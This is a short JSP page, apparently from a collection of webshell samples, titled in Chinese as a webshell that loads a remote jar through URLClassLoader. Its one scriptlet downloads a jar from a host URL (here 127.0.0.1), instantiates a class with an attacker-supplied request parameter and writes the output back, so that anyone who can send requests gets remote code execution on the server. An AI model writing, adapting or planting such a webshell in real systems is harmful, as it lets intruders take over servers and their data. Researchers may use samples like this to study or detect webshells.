<%@ page import="java.net.URL" %>
<%@ page import="java.net.URLClassLoader" %>
<html>
<body>
<h2>URLClassLoader加载远程jar的JSP Webshell</h2>
<%
    response.getOutputStream().write(new URLClassLoader(new URL[]{new URL("http://127.0.0.1:80/threedr3am.jar")}).loadClass("Threedr3am_4").getConstructor(String.class).newInstance(String.valueOf(request.getParameter("threedr3am"))).toString().getBytes());
%>
</body>
</html>